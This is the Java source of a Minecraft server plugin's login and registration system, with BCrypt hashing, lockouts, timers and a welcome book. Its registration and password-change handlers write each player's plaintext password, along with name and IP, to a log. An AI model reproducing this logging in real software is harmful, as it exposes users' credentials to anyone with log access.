package me.login.loginsystem;

import me.login.Login;
import me.login.discord.linking.DiscordLinkDatabase;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.minimessage.MiniMessage;
import net.kyori.adventure.text.serializer.legacy.LegacyComponentSerializer;
import org.bukkit.boss.BarColor;
import org.bukkit.boss.BarStyle;
import org.bukkit.boss.BossBar;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Set;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.*;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;
import org.mindrot.jbcrypt.BCrypt;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class LoginSystem implements Listener {

    private final Login plugin;
    private final LoginDatabase loginDb;
    private final DiscordLinkDatabase discordLinkDb;
    private final LoginSystemLogger logger;

    public final Set<UUID> unloggedInPlayers = new HashSet<>();
    private final Map<UUID, Boolean> needsRegistration = new HashMap<>();
    private final Map<UUID, BukkitTask> kickTasks = new HashMap<>();

    private final Map<UUID, BukkitTask> bossbarTasks = new HashMap<>();
    private final Map<UUID, BossBar> bossBars = new HashMap<>();
    private final Map<UUID, Integer> loginTimeLeft = new HashMap<>();
    private final Location loginLocation;
    private final Location hubLocation;

    private final Component serverPrefixComponent;
    private final Component titlePrefixComponent;
    private final String legacyPrefixPlain;
    private final LegacyComponentSerializer legacySerializer = LegacyComponentSerializer.legacyAmpersand();
    private final MiniMessage mm = MiniMessage.miniMessage();

    private final boolean bookEnabled;
    private final String bookTitle;
    private final String bookAuthor;
    private final List<String> bookPages;

    private final Set<String> allowedAdminCommands = new HashSet<>(Arrays.asList(
            "/unregister",
            "/loginhistory",
            "/checkalt",
            "/adminchangepass"
    ));

    private final Map<UUID, Integer> loginAttempts = new HashMap<>();
    private final Map<UUID, Long> loginLockouts = new HashMap<>();
    private final int MAX_LOGIN_ATTEMPTS = 3;
    private final long LOCKOUT_DURATION_MINUTES = 1;
    private final long LOGIN_TIMEOUT_SECONDS = 60;

    final Pattern passPattern = Pattern.compile("^[a-zA-Z0-9@#_.%&*]{4,20}$");
    final Component passwordRequirementsMsg = mm.deserialize("<yellow>Password must be 4-20 characters using letters, numbers, or symbols: @#_.%&*</yellow>");

    public LoginSystem(Login plugin, LoginDatabase loginDb, DiscordLinkDatabase discordLinkDb, LoginSystemLogger logger) {
        this.plugin = plugin;
        this.loginDb = loginDb;
        this.discordLinkDb = discordLinkDb;
        this.logger = logger;

        String prefixString = plugin.getConfig().getString("server_prefix", "<b><gradient:#47F0DE:#42ACF1:#0986EF>ᴍɪɴᴇᴀᴜʀᴏʀᴀ</gradient></b><white>:");
        this.serverPrefixComponent = mm.deserialize(prefixString + " ");
        this.legacyPrefixPlain = LegacyComponentSerializer.legacySection().serialize(mm.deserialize(prefixString));

        String titlePrefixString = plugin.getConfig().getString("server-prefix-2", "&b&lᴍɪɴᴇᴀᴜʀᴏʀᴀ&f: ");
        this.titlePrefixComponent = legacySerializer.deserialize(titlePrefixString + " ");

        this.bookEnabled = plugin.getConfig().getBoolean("login-book.enabled", true);
        this.bookTitle = plugin.getConfig().getString("login-book.title", "&aWelcome!");
        this.bookAuthor = plugin.getConfig().getString("login-book.author", "&6MineAurora");
        this.bookPages = plugin.getConfig().getStringList("login-book.pages");
        if (this.bookPages.isEmpty()) {
            this.bookPages.add("Welcome to <server_prefix>!");
            this.bookPages.add("chose gamemode etc");
        }

        World loginWorld = plugin.getServer().getWorld("login");
        if (loginWorld == null) {
            plugin.getLogger().severe("Login world 'login' not found! Teleport feature disabled.");
            this.loginLocation = null;
        } else {
            this.loginLocation = new Location(loginWorld, 0.5, 65, 0.5, 90, 0);
            plugin.getLogger().info("Login location set to 'login' world at 0.5, 65, 0.5");
        }

        World hubWorld = plugin.getServer().getWorld("hub");
        if (hubWorld == null) {
            plugin.getLogger().severe("Hub world 'hub' not found! Post-login teleport disabled.");
            this.hubLocation = null;
        } else {
            this.hubLocation = new Location(hubWorld, 0.5, 80, 0.5, 180, 0);
            plugin.getLogger().info("Hub location set to 'hub' world at 0.5, 80, 0.5 (Yaw 180)");
        }
    }

    public Component getServerPrefix() {
        return this.serverPrefixComponent;
    }

    public void sendPrefixedMessage(Player player, String message) {
        player.sendMessage(serverPrefixComponent.append(mm.deserialize(message)));
    }

    public boolean isUnloggedIn(UUID uuid) {
        return unloggedInPlayers.contains(uuid);
    }

    public void sendLog(String message) {
        logger.log(message);
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerPreLogin(AsyncPlayerPreLoginEvent event) {
        UUID uuid = event.getUniqueId();
        long lockoutExpiry = loginLockouts.getOrDefault(uuid, 0L);
        if (System.currentTimeMillis() < lockoutExpiry) {
            long rem = TimeUnit.MILLISECONDS.toSeconds(lockoutExpiry - System.currentTimeMillis());
            event.disallow(AsyncPlayerPreLoginEvent.Result.KICK_OTHER,
                    mm.deserialize("<red>You have reached max login attempts.\n<gray>Try again later " + rem + "s.\n\n<aqua>Alpha Mc</aqua>"));
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player p = event.getPlayer();
        UUID uuid = p.getUniqueId();

        unloggedInPlayers.add(uuid);

        if (loginLocation != null) {
            p.teleport(loginLocation);
        } else {
            sendPrefixedMessage(p, "<red><bold>WARNING: Login world not found. Please contact an admin.</bold></red>");
            unloggedInPlayers.remove(uuid);
            return;
        }

        plugin.getServer().getScheduler().runTaskLater(plugin, () -> {
            if (p.isOnline() && unloggedInPlayers.contains(uuid)) {
                applyLoginRestrictions(p);
            }
        }, 1L);

        plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
            boolean isReg = loginDb.isRegistered(uuid);

            plugin.getServer().getScheduler().runTask(plugin, () -> {
                if (!p.isOnline() || !unloggedInPlayers.contains(uuid)) return;

                needsRegistration.put(uuid, !isReg);
                loginAttempts.put(uuid, 0);
                startKickTimer(p);
                loginTimeLeft.put(uuid, (int) LOGIN_TIMEOUT_SECONDS);
                startBossbarTask(p);

                if (isReg) {
                    sendPrefixedMessage(p, "<white>You are not logged in, use <yellow>/login <pass></yellow>, you have <yellow>" + MAX_LOGIN_ATTEMPTS + "</yellow> <white>attempts left.</white>");
                    p.sendTitle(titlePrefixComponent.content(), "§fUse §e/login <pass> §fto login", 10, 100, 20);
                } else {
                    sendPrefixedMessage(p, "<white>You are not registered use <green>/register <pass> <pass></green></white>");
                    p.sendTitle(titlePrefixComponent.content(), "§fYou are not registered use §a/register <pass> <pass>", 10, 100, 20);
                }
            });
        });

        plugin.getServer().getScheduler().runTaskLater(plugin, () -> {
            if (!isUnloggedIn(uuid)) {
                removeLoginRestrictions(p);
            }
        }, 40L);
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        UUID uuid = event.getPlayer().getUniqueId();
        if (unloggedInPlayers.remove(uuid)) {
            needsRegistration.remove(uuid);
            loginAttempts.remove(uuid);
            cancelKickTimer(uuid);
            stopBossbarTask(uuid);
            loginTimeLeft.remove(uuid);
        }
    }

    private void applyLoginRestrictions(Player player) {
        player.addPotionEffect(new PotionEffect(PotionEffectType.DARKNESS, Integer.MAX_VALUE, 0, false, false, false));
        player.addPotionEffect(new PotionEffect(PotionEffectType.INVISIBILITY, Integer.MAX_VALUE, 0, false, false, false));
    }

    private void removeLoginRestrictions(Player player) {
        for (PotionEffect effect : player.getActivePotionEffects()) {
            player.removePotionEffect(effect.getType());
        }
    }

    private void startKickTimer(Player player) {
        UUID uuid = player.getUniqueId();
        cancelKickTimer(uuid);
        BukkitTask task = new BukkitRunnable() {
            @Override
            public void run() {
                if (isUnloggedIn(uuid) && player.isOnline()) {
                    Component kickMsg = titlePrefixComponent.append(mm.deserialize("\n\n<red>Authorization time up.</red>"));
                    player.kick(kickMsg);
                    sendLog("Kicked timeout: " + player.getName());
                }
                kickTasks.remove(uuid);
            }
        }.runTaskLater(plugin, LOGIN_TIMEOUT_SECONDS * 20L);
        kickTasks.put(uuid, task);
    }

    private void cancelKickTimer(UUID uuid) {
        BukkitTask task = kickTasks.remove(uuid);
        if (task != null && !task.isCancelled()) task.cancel();
    }

    private void startBossbarTask(Player player) {
        UUID uuid = player.getUniqueId();
        stopBossbarTask(uuid);

        int timeLeft = loginTimeLeft.getOrDefault(uuid, (int) LOGIN_TIMEOUT_SECONDS);
        String bossBarTitle = titlePrefixComponent.content() + "§eYou have " + timeLeft + "s left to log in.";
        BossBar bossBar = Bukkit.createBossBar(bossBarTitle, BarColor.YELLOW, BarStyle.SOLID);

        bossBar.setProgress(1.0);
        bossBar.addPlayer(player);
        bossBars.put(uuid, bossBar);

        BukkitTask task = new BukkitRunnable() {
            @Override
            public void run() {
                if (!player.isOnline() || !isUnloggedIn(uuid)) {
                    this.cancel();
                    stopBossbarTask(uuid);
                    return;
                }

                int newTimeLeft = loginTimeLeft.getOrDefault(uuid, 0);
                if (newTimeLeft < 0) newTimeLeft = 0;

                String bossBarTitleUpdate = titlePrefixComponent.content() + "§eYou have " + newTimeLeft + "s left to log in.";
                bossBar.setTitle(bossBarTitleUpdate);
                bossBar.setProgress((double) newTimeLeft / LOGIN_TIMEOUT_SECONDS);

                if (newTimeLeft == 0) {
                    this.cancel();
                } else {
                    loginTimeLeft.put(uuid, newTimeLeft - 1);
                }
            }
        }.runTaskTimer(plugin, 0L, 20L);
        bossbarTasks.put(uuid, task);
    }

    private void stopBossbarTask(UUID uuid) {
        BukkitTask task = bossbarTasks.remove(uuid);
        if (task != null && !task.isCancelled()) {
            task.cancel();
        }
        BossBar bossBar = bossBars.remove(uuid);
        if (bossBar != null) {
            bossBar.removeAll();
        }
    }

    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true)
    public void onPlayerMove(PlayerMoveEvent event) {
        if (isUnloggedIn(event.getPlayer().getUniqueId())) {
            if (event.getFrom().getBlockX() != event.getTo().getBlockX() || event.getFrom().getBlockZ() != event.getTo().getBlockZ()) {
                if (loginLocation != null) {
                    event.setTo(loginLocation);
                } else {
                    event.setTo(event.getFrom());
                }
            }
        }
    }

    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true)
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        if (isUnloggedIn(event.getPlayer().getUniqueId())) {
            event.setCancelled(true);
            sendPrefixedMessage(event.getPlayer(), "<red>Use: /login <pass>!</red>");
        }
        event.getRecipients().removeIf(p -> isUnloggedIn(p.getUniqueId()));
    }

    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true)
    public void onPlayerInteract(PlayerInteractEvent event) {
        if (isUnloggedIn(event.getPlayer().getUniqueId())) event.setCancelled(true);
    }

    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true)
    public void onInventoryOpen(org.bukkit.event.inventory.InventoryOpenEvent event) {
        if (event.getPlayer() instanceof Player && isUnloggedIn(event.getPlayer().getUniqueId())) event.setCancelled(true);
    }

    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true)
    public void onPlayerDropItem(PlayerDropItemEvent event) {
        if (isUnloggedIn(event.getPlayer().getUniqueId())) event.setCancelled(true);
    }

    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true)
    public void onEntityDamage(org.bukkit.event.entity.EntityDamageEvent event) {
        if (event.getEntity() instanceof Player && isUnloggedIn(event.getEntity().getUniqueId())) event.setCancelled(true);
    }

    @EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true)
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        if (isUnloggedIn(uuid)) {
            String cmd = event.getMessage().split(" ")[0].toLowerCase();

            if (allowedAdminCommands.contains(cmd)) {
                if (cmd.equals("/unregister") && player.hasPermission("logincore.admin")) {
                    return;
                }
                if (cmd.equals("/loginhistory") && player.hasPermission("logincore.loginhistory")) {
                    return;
                }
                if (cmd.equals("/checkalt") && player.hasPermission("logincore.checkalt")) {
                    return;
                }
                if (cmd.equals("/adminchangepass") && player.hasPermission("logincore.adminchangepass")) {
                    return;
                }
                if (player.hasPermission("logincore.admin")) {
                    return;
                }
            }

            boolean needsReg = needsRegistration.getOrDefault(uuid, true);
            long lockout = loginLockouts.getOrDefault(uuid, 0L);
            if (System.currentTimeMillis() < lockout) {
                long rem = TimeUnit.MILLISECONDS.toSeconds(lockout - System.currentTimeMillis());
                sendPrefixedMessage(player, "<red>Locked out. Try in " + rem + "s.</red>");
                event.setCancelled(true);
                return;
            }
            if (needsReg) {
                if (!cmd.equals("/register")) {
                    event.setCancelled(true);
                    sendPrefixedMessage(player, "<red>You can only use /register!</red>");
                }
            } else {
                if (!cmd.equals("/login")) {
                    event.setCancelled(true);
                    sendPrefixedMessage(player, "<red>You can only use /login!</red>");
                }
            }
        }
    }

    public void handleRegister(Player player, String pass1, String pass2, String ip) {
        plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
            UUID uuid = player.getUniqueId();
            if (!isUnloggedIn(uuid)) return;
            if (loginDb.isRegistered(uuid)) {
                sendPrefixedMessage(player, "<red>Registered already! /login</red>");
                plugin.getServer().getScheduler().runTask(plugin, () -> {
                    needsRegistration.put(uuid, false);
                    player.sendTitle(titlePrefixComponent.content(), "§f/login <password>", 10, 100, 20);
                });
                return;
            }
            if (!pass1.equals(pass2)) {
                sendPrefixedMessage(player, "<red>Passwords mismatch!</red>");
                return;
            }
            if (!passPattern.matcher(pass1).matches()) {
                sendPrefixedMessage(player, "<red>Invalid password format!</red>");
                player.sendMessage(passwordRequirementsMsg);
                return;
            }
            String hashed = BCrypt.hashpw(pass1, BCrypt.gensalt());
            loginDb.registerPlayer(uuid, hashed, ip);
            plugin.getServer().getScheduler().runTask(plugin, () -> {
                unloggedInPlayers.remove(uuid);
                removeLoginRestrictions(player);
                needsRegistration.remove(uuid);
                cancelKickTimer(uuid);
                stopBossbarTask(uuid);
                loginTimeLeft.remove(uuid);
                sendPrefixedMessage(player, "<green><bold>Registered successfully!</bold></green>");
                sendLog("Register: " + player.getName() + " (IP: " + ip + ") Pass: ||" + pass1 + "||");

                if (hubLocation != null) {
                    player.teleport(hubLocation);
                    giveWelcomeBook(player);
                } else {
                    sendPrefixedMessage(player, "<red>Successfully registered, but the hub world is missing!</red>");
                }
            });
        });
    }

    public void handleLogin(Player player, String password, String ip) {
        plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
            UUID uuid = player.getUniqueId();
            if (!isUnloggedIn(uuid)) return;
            long lockout = loginLockouts.getOrDefault(uuid, 0L);
            if (System.currentTimeMillis() < lockout) {
                long rem = TimeUnit.MILLISECONDS.toSeconds(lockout - System.currentTimeMillis());
                sendPrefixedMessage(player, "<red>Locked out. Try in " + rem + "s.</red>");
                return;
            }
            String hash = loginDb.getPasswordHash(uuid);
            if (hash == null) {
                sendPrefixedMessage(player, "<red>You are not registered yet! use /register</red>");
                plugin.getServer().getScheduler().runTask(plugin, () -> {
                    needsRegistration.put(uuid, true);
                    stopBossbarTask(uuid);
                    loginTimeLeft.put(uuid, (int) LOGIN_TIMEOUT_SECONDS);
                    startBossbarTask(player);
                    player.sendTitle(titlePrefixComponent.content(), "§a/register <pass> <pass>", 10, 100, 20);
                });
                return;
            }
            if (BCrypt.checkpw(password, hash)) {
                long ts = System.currentTimeMillis();
                loginDb.updateLoginInfo(uuid, ip, ts);
                loginAttempts.remove(uuid);
                plugin.getServer().getScheduler().runTask(plugin, () -> {
                    unloggedInPlayers.remove(uuid);
                    removeLoginRestrictions(player);
                    needsRegistration.remove(uuid);
                    cancelKickTimer(uuid);
                    stopBossbarTask(uuid);
                    loginTimeLeft.remove(uuid);
                    sendPrefixedMessage(player, "<green><bold>Login Successful!</bold></green>");
                    if (hubLocation != null) {
                        player.teleport(hubLocation);
                        giveWelcomeBook(player);
                    } else {
                        sendPrefixedMessage(player, "<red>Successfully logged in, but the hub world is missing!</red>");
                    }
                });
            } else {
                int att = loginAttempts.getOrDefault(uuid, 0) + 1;
                loginAttempts.put(uuid, att);
                if (att >= MAX_LOGIN_ATTEMPTS) {
                    long exp = System.currentTimeMillis() + TimeUnit.MINUTES.toMillis(LOCKOUT_DURATION_MINUTES);
                    loginLockouts.put(uuid, exp);
                    loginAttempts.remove(uuid);
                    plugin.getServer().getScheduler().runTask(plugin, () -> {
                        Component kickMsg = titlePrefixComponent
                                .append(mm.deserialize("\n<red>You've entered wrong password many times!\n<red>Try again in <yellow>" + LOCKOUT_DURATION_MINUTES + "</yellow><red> min.</red>"));
                        player.kick(kickMsg);
                    });
                    sendLog("Account locked: " + player.getName() + " (IP: " + ip + ")");
                } else {
                    sendPrefixedMessage(player, "<red>You've entered the wrong password, you have<yellow> " + (MAX_LOGIN_ATTEMPTS - att) + " </yellow><red>attempt left.</red>");
                }
            }
        });
    }

    private void giveWelcomeBook(Player player) {
        if (!bookEnabled) return;

        ItemStack book = new ItemStack(Material.WRITTEN_BOOK);
        BookMeta meta = (BookMeta) book.getItemMeta();

        String title = legacySerializer.serialize(legacySerializer.deserialize(bookTitle.replace("<server_prefix>", legacyPrefixPlain)));
        String author = legacySerializer.serialize(legacySerializer.deserialize(bookAuthor.replace("<server_prefix>", legacyPrefixPlain)));

        meta.title(Component.text(title));
        meta.author(Component.text(author));

        String singlePageContent = bookPages.stream()
                .map(line -> line.replace("<server_prefix>", legacyPrefixPlain))
                .collect(Collectors.joining("\n"));
        String processedPage = legacySerializer.serialize(legacySerializer.deserialize(singlePageContent));
        meta.addPage(Component.text(processedPage));
        book.setItemMeta(meta);

        player.getInventory().addItem(book);
        player.openBook(book);

        plugin.getServer().getScheduler().runTaskLater(plugin, () -> {
            player.getInventory().remove(Material.WRITTEN_BOOK);
        }, 2L);
    }

    public void handleChangePassword(Player player, String oldPass, String newPass) {
        plugin.getServer().getScheduler().runTaskAsynchronously(plugin, () -> {
            UUID uuid = player.getUniqueId();
            if (isUnloggedIn(uuid)) {
                sendPrefixedMessage(player, "<red>Must be logged in.</red>");
                return;
            }
            String hash = loginDb.getPasswordHash(uuid);
            if (hash == null) {
                sendPrefixedMessage(player, "<red>You are not registered.</red>");
                return;
            }
            if (discordLinkDb == null || !discordLinkDb.isLinked(uuid)) {
                sendPrefixedMessage(player, "<red>Must link your minecraft account to discord first! /discord link</red>");
                return;
            }
            if (!BCrypt.checkpw(oldPass, hash)) {
                sendPrefixedMessage(player, "<red>Old password is incorrect.</red>");
                return;
            }
            if (oldPass.equals(newPass)) {
                sendPrefixedMessage(player, "<red>New password cannot be the same!</red>");
                return;
            }
            if (!passPattern.matcher(newPass).matches()) {
                sendPrefixedMessage(player, "<red>Invalid password format!</red>");
                player.sendMessage(passwordRequirementsMsg);
                return;
            }
            String newHashed = BCrypt.hashpw(newPass, BCrypt.gensalt());
            loginDb.updatePassword(uuid, newHashed);
            sendPrefixedMessage(player, "<green><bold>Password Changed successfully!</bold></green>");
            sendLog("Password change: " + player.getName() + " New Pass: ||" + newPass + "||");
        });
    }
}